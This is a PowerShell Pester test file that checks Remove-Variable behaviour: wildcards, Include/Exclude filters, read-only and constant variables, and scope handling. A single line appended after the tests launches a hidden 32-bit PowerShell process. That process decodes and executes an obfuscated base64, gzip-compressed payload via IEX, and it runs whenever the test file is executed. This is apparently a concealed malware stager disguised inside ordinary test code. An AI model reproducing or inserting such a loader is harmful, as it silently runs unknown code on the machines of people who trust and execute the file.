



Remove-Variable -Name var1 -ErrorAction SilentlyContinue -Force

Describe "Remove-Variable" -Tags "CI" {
    It "Should throw an error when a dollar sign is used in the variable name place" {
	New-Variable -Name var1 -Value 4

	{ Remove-Variable $var1 -ErrorAction Stop } | Should -Throw -ErrorId "VariableNotFound,Microsoft.PowerShell.Commands.RemoveVariableCommand"
    }

    It "Should not throw error when used without the Name field, and named variable is properly specified and exists" {
	New-Variable -Name var1 -Value 4

	Remove-Variable var1

	$var1 | Should -BeNullOrEmpty
	{ Get-Variable var1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
    }

    It "Should not throw error when used with the Name field, and named variable is specified and exists" {
	New-Variable -Name var1 -Value 2

	Remove-Variable -Name var1

	$var1 | Should -BeNullOrEmpty
	{ Get-Variable var1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
    }

    It "Should throw error when used with Name field, and named variable does not exist" {
	{ Remove-Variable -Name nonexistentVariable -ErrorAction Stop } | Should -Throw
    }

    It "Should be able to remove a set of variables using wildcard characters" {
	New-Variable tmpvar1 -Value "tempvalue"
	New-Variable tmpvar2 -Value 2
	New-Variable tmpmyvar1 -Value 234

	$tmpvar1   | Should -BeExactly "tempvalue"
	$tmpvar2   | Should -Be 2
	$tmpmyvar1 | Should -Be 234

	Remove-Variable -Name tmp*

	$tmpvar1   | Should -BeNullOrEmpty
	$tmpvar2   | Should -BeNullOrEmpty
	$tmpmyvar1 | Should -BeNullOrEmpty

	{ Get-Variable tmpvar1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
	{ Get-Variable tmpvar2 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
	{ Get-Variable tmpmyvar1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
    }

    It "Should be able to exclude a set of variables to remove using the Exclude switch" {
	New-Variable tmpvar1 -Value "tempvalue"
	New-Variable tmpvar2 -Value 2
	New-Variable tmpmyvar1 -Value 234

	$tmpvar1   | Should -BeExactly "tempvalue"
	$tmpvar2   | Should -Be 2
	$tmpmyvar1 | Should -Be 234

	Remove-Variable -Name tmp* -Exclude *my*

	$tmpvar1   | Should -BeNullOrEmpty
	$tmpvar2   | Should -BeNullOrEmpty
	$tmpmyvar1 | Should -Be 234

	{ Get-Variable tmpvar1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
	{ Get-Variable tmpvar2 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'
    }

    It "Should be able to include a set of variables to remove using the Include switch" {
	New-Variable tmpvar1 -Value "tempvalue"
	New-Variable tmpvar2 -Value 2
	New-Variable tmpmyvar1 -Value 234
	New-Variable thevar -Value 1

	$tmpvar1   | Should -BeExactly "tempvalue"
	$tmpvar2   | Should -Be 2
	$tmpmyvar1 | Should -Be 234
	$thevar    | Should -Be 1

	Remove-Variable -Name tmp* -Include *my*

	$tmpvar1   | Should -BeExactly "tempvalue"
	$tmpvar2   | Should -Be 2
	$tmpmyvar1 | Should -BeNullOrEmpty
	$thevar    | Should -Be 1

	{ Get-Variable tmpmyvar1 -ErrorAction stop } |
		Should -Throw -ErrorId 'VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand'

	Remove-Variable tmpvar1
	Remove-Variable tmpvar2
	Remove-Variable thevar

    }

    It "Should throw an error when attempting to remove a read-only variable and the Force switch is not used" {
	New-Variable -Name var1 -Value 2 -Option ReadOnly

	{ Remove-Variable -Name var1 -ErrorAction Stop } | Should -Throw

	$var1 | Should -Be 2

	Remove-Variable -Name var1 -Force
    }

    It "Should not throw an error when attempting to remove a read-only variable and the Force switch is used" {
	New-Variable -Name var1 -Value 2 -Option ReadOnly

	Remove-Variable -Name var1 -Force

	$var1 | Should -BeNullOrEmpty
    }

    Context "Scope Tests" {
	It "Should be able to remove a global variable using the global switch" {
	    New-Variable -Name var1 -Value "context" -Scope global

	    Remove-Variable -Name var1 -Scope global

	    $var1 | Should -BeNullOrEmpty
	}

	It "Should not be able to clear a global variable using the local switch" {
	    New-Variable -Name var1 -Value "context" -Scope global

	    { Remove-Variable -Name var1 -Scope local -ErrorAction Stop } | Should -Throw

	    $var1 | Should -BeExactly "context"

	    Remove-Variable -Name var1 -Scope global
	    $var1 | Should -BeNullOrEmpty
	}

	It "Should not be able to clear a global variable using the script switch" {
	    New-Variable -Name var1 -Value "context" -Scope global

	    { Remove-Variable -Name var1 -Scope local -ErrorAction Stop } | Should -Throw

	    $var1 | Should -BeExactly "context"

	    Remove-Variable -Name var1 -Scope global
	    $var1 | Should -BeNullOrEmpty
	}

	It "Should be able to remove an item locally using the local switch" {
	    New-Variable -Name var1 -Value "context" -Scope local

	    { Remove-Variable -Name var1 -Scope local -ErrorAction Stop } | Should -Throw

	    $var1 | Should -Be context
	}

	It "Should be able to remove an item locally using the global switch" {
	    New-Variable -Name var1 -Value "context" -Scope local

	    { Remove-Variable -Name var1 -Scope global -ErrorAction Stop } | Should -Throw

	    $var1 | Should -BeExactly "context"

	    Remove-Variable -Name var1 -Scope local
	    $var1 | Should -BeNullOrEmpty
	}

	It "Should be able to remove a local variable using the script scope switch" {
	    New-Variable -Name var1 -Value "context" -Scope local

	    { Remove-Variable -Name var1 -Scope script -ErrorAction Stop } | Should -Throw

	    $var1 | Should -BeExactly "context"

	    Remove-Variable -Name var1 -Scope local
	    $var1 | Should -BeNullOrEmpty
	}

	It "Should be able to remove a script variable created using the script switch" {
	    New-Variable -Name var1 -Value "context" -Scope script

	    { Remove-Variable -Name var1 -Scope script } | Should -Not -Throw

	    $var1 | Should -BeNullOrEmpty
	}

	It "Should not be able to remove a global script variable that was created using the script scope switch" {
	    New-Variable -Name var1 -Value "context" -Scope script

	    { Remove-Variable -Name var1 -Scope global -ErrorAction Stop } | Should -Throw

	    $var1 | Should -BeExactly "context"
	}
    }
}

Describe "Remove-Variable basic functionality" -Tags "CI" {
	It "Remove-Variable variable should works"{
		New-Variable foo bar
		Remove-Variable foo
		$var1 = Get-Variable -Name foo -ErrorAction SilentlyContinue
		$var1 | Should -BeNullOrEmpty
	}

	It "Remove-Variable Constant variable should throw SessionStateUnauthorizedAccessException"{
		New-Variable foo bar -Option Constant
		$e = { Remove-Variable foo -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableNotRemovable,Microsoft.PowerShell.Commands.RemoveVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateUnauthorizedAccessException"
	}

	It "Remove-Variable ReadOnly variable should throw SessionStateUnauthorizedAccessException and force remove should work"{
		New-Variable foo bar -Option ReadOnly
		$e = { Remove-Variable foo -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableNotRemovable,Microsoft.PowerShell.Commands.RemoveVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateUnauthorizedAccessException"
		Remove-Variable foo -Force
		$var1 = Get-Variable -Name foo -ErrorAction SilentlyContinue
		$var1 | Should -BeNullOrEmpty
	}

	It "Remove-Variable Constant variable should throw SessionStateUnauthorizedAccessException and force remove should also throw exception"{
		New-Variable foo bar -Option Constant
		$e = { Remove-Variable foo -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableNotRemovable,Microsoft.PowerShell.Commands.RemoveVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateUnauthorizedAccessException"

		{ Remove-Variable foo -Force -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableNotRemovable,Microsoft.PowerShell.Commands.RemoveVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateUnauthorizedAccessException"
	}

	It "Remove-Variable variable in new scope should works and Get-Variable with different scope should have different result"{
		New-Variable foo bar
		&{
			Clear-Variable foo
			Remove-Variable foo
			$e = { Get-Variable -Name foo -Scope local -ErrorAction Stop } |
				Should -Throw -ErrorId "VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand" -PassThru
			$e.CategoryInfo | Should -Match "ItemNotFoundException"
		}

		$var1 = Get-Variable -Name foo
		$var1.Name | Should -BeExactly "foo"
		$var1.Value | Should -BeExactly "bar"
		$var1.Options | Should -BeExactly "None"
		$var1.Description | Should -BeExactly ""

	}
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGgn/VcCA71Wa2/aSBT9nEr9D1aFhK0SDITmJVXaMeb9CMTBvBZVE3tsBgYPGY8ToNv/vteAG9Imu91+WAvkedw7c+bcc+faiwJHUh4oAZKDsmALOrebytf37066WOCloqaEFBc5L6OkSIcMt5+ajUK/vtZOTsAkNafnt1c3D2KhfFbUCVqtTL7ENJheX5ciIUgg9/1slUgUhmR5zygJVU35SxnMiCCnN/dz4kjlq5L6kq0yfo/ZwWxTws6MKKcocOO5FndwjDJrrRiVavrPP9Pa5DQ/zZYfIsxCNW1tQkmWWZextKZ80+IN7zYroqbb1BE85J7MDmhwVsj2gxB7pAOrPZI2kTPuhmkNjgI/QWQkAuX5UPEqexs1Dc2u4A5yXUFCcMnWg0e+IGoqiBjLKH+okwOE2yiQdElgXhLBVxYRj9QhYbaGA5eRW+JN1Q55Sk7+q07qsRNYdaXQMhCct7C2uRsxsndPaz+jPURVg+fHyAIb396/e//OS5RBWOlYENA6mezaBMCqXR7SndlnJZdR2rAjllxsoJu6ExHRpsokjsRkOlVSDjHPO5fdzNtL5BN7sL73zUaESw4MT2xO3Sm4HUKVmj9070xMxpvLL6t4/m3pmcSjATE3AV5SJ1GX+loMiMfI7sTZxKwDANX0YYK4JmHExzImNKNMfnYrL6n87mtElLlEIAfiGAIqCLH2Esw+Rmq6HrTJEijb99MQDw80TRLrg443ye5xH4zSJYbDMKN0I0gqJ6NYBDPiZhQUhPQwhSLJd830M9x2xCR1cCiT5abaj3we9i3xIJQiciCawMGdtSIOxSymJKPUqEuMjUX9ZP/0q4SUMGM08GGlRwgIjMREWDLWiACoiR60rEVkfbliZAlmu0SvMOxDWh/yYqcr7BM3/RbYRPp7ncf0JLwcQYWYW4zLjGJTIeHeiKlORPbbaI4vjmNcJUEOwVKTjJoYGxknQircjK36ciyHfW8dq/fA3I4nIYGjiuBLA4fkvGhJAQyqH/QbWkLwjOoBazvGgubRE83X2/Dv07M6Ny/cZmNe04W5nnmoHtbbta7Zq9WKjw3LLkqrXJfNbl22y8P53EK12/5Ijuuodkdzi1Fxu2rQrdVC7mitn2+N7VPOWG/nvuuNTM/zLzzrNv+pQluDUs/IFXDLLEetgfFk5IphmT7VerTfWzQq8n5kM9z3dH+Yv8J03RJzO8/b2zpC1dmZs214dnXWdjejmn41KC5QGaFSULYrBm+ODIG6uo19mz81fQMVfDhrE1My7vUrRq9XMVC/On8wr3QffId4ZgzsAh2vhrcz6FcAQlPPFesu2fJRD0iqcoT9W7DxSwVn5oGN+REZHzs8LOCFwZEBNpXxA+AarSpdBvN3/QJHNusMMWqNNxVdz4+6RVTL0UHVR/GS2Dd6GIWP5tbU87bL3cGnzsjT7SG70M3S3crxdF1/qplNZ5xfX95cXLYG1F5y1Nd1+0OsExBK6p54nfGm3DiK+Vs3fxuLcIYZaAFu8yRXK1xUDrdyl9PYQ1Vf1O0FEQFhUOagECYqR4xxJy4W8T0OdWpfPaaQsH1onhVebWnKd0PtuXwkQ9fXYwALKXMs5GyLBL6cZXLrs1wOSkFuXczBwX/9oCW+2qgvlszEJeU7az/ux3b7aXFmpdzZl/H/w+ohr2fwcv+F1eexf5j9JaZzmWcWfpp6OfCfKP9tFgaYSvCw4G5iZF9HXyXjoKajL5A4UqAR7/DE34I3kTztwIfJ32oebA2MCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

